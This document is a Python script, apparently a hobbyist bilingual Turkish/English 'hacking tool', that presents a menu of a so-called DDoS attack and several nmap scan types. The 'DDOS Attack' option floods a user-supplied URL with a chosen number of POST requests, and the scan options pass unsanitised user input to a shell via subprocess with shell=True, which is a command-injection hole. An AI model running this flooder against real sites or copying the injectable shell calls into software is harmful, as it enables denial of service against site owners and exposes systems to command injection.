import os
import time
import requests
import subprocess
import webbrowser
webbrowser.open("https://github.com/alidegerli")
a = "*"*15
X = '\033[1;33m' #SARI
Z1 = '\033[2;31m' #kırmızı
F = '\033[2;32m' #YEŞİL
A = '\033[2;34m'#Mavi
C = '\033[2;35m' #pembe
B = '\033[2;36m'#turkaz
Y = '\033[1;34m' #mor

print(a,f"""\n{B}
Coded by https://github.com/alidegerli
Dil Seçin (Select Lang)
[+] ==> Türkçe
[+] ==> English

""")
lang = input(f"{Y}Lütfen Seçiminizi Giriniz (Please Choose ) Türkçe, English ==> ")
if(lang == "Türkçe" or lang == "türkçe" or lang == "TÜRKÇE" or lang == "TüRkÇe" or lang == "tüRKÇE" or lang == "türkÇE" or lang == "türkCe" or lang == "TÜRKce" or lang == "TürKçE" or lang == "türKÇe" or lang == "TüRKCe" or lang == "tÜrKçE" or lang == "tÜrkÇe" or lang == "TürkÇE" or lang == "tüRkÇE" or lang == "TÜrKçE" or lang == "TüRkÇe" or lang == "tÜRkçE" or lang == "TÜRKÇe"):
    print(f"{F}[+] ==> Dil Türkçe Olarak Ayarlandı İyi Kullanımlar")
    time.sleep(0.7)
    print(f"{Z1}nmap ve sqlmap araçlarını kurduğunuzdan emin olun")
    time.sleep(0.5)
    print(a,f"""\n{X}
    [+] ==> https://github.com/alidegerli

    {1} ==> DDOS Saldırısı (URL)
    {2} ==> Admin Panel Bulucu (URL)
    {3} ==> TCP SYN Taraması (İP Adres)
    {4} ==> TCP Bağlantı Taraması (İP Adres)
    {5} ==> UDP Taraması (İP Adres)
    {6} ==> Ping Taraması (İP Adres)
    {7} ==> Servis ve Versiyon Taraması (İP Adres)
    {8} ==> OS Tespiti (İP Adres)\n
    """,a)
    islem = int(input(f"{Y}Lütfen Seçiminizi Giriniz (2.seçenek sonrasında nmap aracı kullanılmıştır) ==> "))
    if(islem == 1):
        url = input("Hedef Url Giriniz ==> ")
        sp = int(input("Gönderilmesini İstediğin Paket Sayısını Gir ==> "))
        for i in range(sp):
            
            a = requests.post(url)
            if(a.status_code == 200):
                print(f"{F}Gönderildi Paket sayısı",i)
                i+=1
            else:
                print(f"{Z1}Bir Hata Oluştu Gönderilemedi")
            
            
            



        
    if(islem == 4):
        ip = input("Tarama yapmak istediğiniz IP adresini girin: ")
        time.sleep(1)
        print(f"{F} Tarama Başlatılıyor ...")
        time.sleep(0.8)

        command = f"nmap -sT {ip}"
        subprocess.call(command, shell=True)
    
    if(islem == 3):
        ip = input("Tarama yapmak istediğiniz IP adresini girin: ")
        time.sleep(1)
        print(f"{F} Tarama Başlatılıyor ...")
        time.sleep(0.8)

        command = f"nmap -sS {ip}"
        subprocess.call(command, shell=True)

    if(islem == 5):
        ip = input("Tarama yapmak istediğiniz IP adresini girin: ")
        time.sleep(1)
        print(f"{F} Tarama Başlatılıyor ...")
        time.sleep(0.8)

        command = f"nmap -sU {ip}"
        subprocess.call(command, shell=True)  
    if(islem == 6):
        ip = input("Tarama yapmak istediğiniz IP adresini girin: ")
        time.sleep(1)
        print(f"{F} Tarama Başlatılıyor ...")
        time.sleep(0.8)

        command = f"nmap -sn {ip}"
        subprocess.call(command, shell=True)


    if(islem == 7):
        ip = input("Tarama yapmak istediğiniz IP adresini girin: ")
        time.sleep(1)
        print(f"{F} Tarama Başlatılıyor ...")
        time.sleep(0.8)

        command = f"nmap -sV {ip}"
        subprocess.call(command, shell=True)
    if(islem == 8):
        ip = input("Tarama yapmak istediğiniz IP adresini girin: ")
        time.sleep(1)
        print(f"{F} Tarama Başlatılıyor ...")
        time.sleep(0.8)

        command = f"nmap -O {ip}"
        subprocess.call(command, shell=True)
    
    
    
        
    if(islem == 2):
    	print("AKTİF DEĞİL")

































if (lang == "English" or lang == "english" or lang == "ENGLISH" or lang == "EnGlIsH" or lang == "eNgLiSh" or lang == "enGlish" or lang == "EngliSH" or lang == "ENglisH" or lang == "EnGLiSH" or lang == "ENGLiSH" or lang == "eNGLISH" or lang == "enGLiSh" or lang == "EnGLISH" or lang == "ENGlISH" or lang == "eNgLISh" or lang == "ENGLISH" or lang == "EnGlISH" or lang == "eNGLiSh" or lang == "ENGlISH" or lang == "EnGLiSh"):
    print(f"{F}[+] ==> Language set to English")
    time.sleep(0.7)
    print(f"{Z1}[+] ==> Make sure you have the nmap and sqlmap tools installed")
    time.sleep(0.5)
    print(a,f"""\n{X}
    [+] ==> https://github.com/alidegerli

    {1} ==> DDOS Attack (URL)
    {2} ==> Admin Page Find (URL)
    {3} ==> TCP SYN Scan (İP Adress)
    {4} ==> TCP Connection Scan (İP Adress)
    {5} ==> UDP Scan (İP Adress)
    {6} ==> Ping Scan (İP Adress)
    {7} ==> Service and Version Scan (İP Adress)
    {8} ==> OS Find (İP Adress)\n
    """,a)
    islem = int(input(f"{Y}Please Enter Your Choice (nmap tool is used after option 2) ==> "))
    if(islem == 1):
        url = input("Hunting Url ==> ")
        sp = int(input("Enter the Number of Packages You Want to be Sent ==>"))
        for i in range(sp):
            
            a = requests.post(url)
            if(a.status_code == 200):
                print(f"{F}Number of packets sent",i)
                i+=1
            else:
                print(f"{Z1}An Error Occurred Could Not Send")
            
            
            



        
    elif(islem == 4):
        ip = input("Enter the IP address you want to scan: ")
        time.sleep(1)
        print(f"{F} Starting Scan ...")
        time.sleep(0.8)

        command = f"nmap -sT {ip}"
        subprocess.call(command, shell=True)
    
    elif(islem == 3):
        ip = input("Enter the IP address you want to scan: ")
        time.sleep(1)
        print(f"{F} Starting Scan ...")
        time.sleep(0.8)

        command = f"nmap -sS {ip}"
        subprocess.call(command, shell=True)

    elif(islem == 5):
        ip = input("Enter the IP address you want to scan: ")
        time.sleep(1)
        print(f"{F} Starting Scan ...")
        time.sleep(0.8)

        command = f"nmap -sU {ip}"
        subprocess.call(command, shell=True)  
    elif(islem == 6):
        ip = input("Enter the IP address you want to scan: ")
        time.sleep(1)
        print(f"{F} Starting Scan ...")
        time.sleep(0.8)

        command = f"nmap -sn {ip}"
        subprocess.call(command, shell=True)


    elif(islem == 7):
        ip = input("Enter the IP address you want to scan: ")
        time.sleep(1)
        print(f"{F} Starting Scan ...")
        time.sleep(0.8)

        command = f"nmap -sV {ip}"
        subprocess.call(command, shell=True)
    elif(islem == 8):
        ip = input("Enter the IP address you want to scan: ")
        time.sleep(1)
        print(f"{F} Starting Scan ...")
        time.sleep(0.8)

        command = f"nmap -O {ip}"
        subprocess.call(command, shell=True)
    else:
        print("NOT ACTIVE")













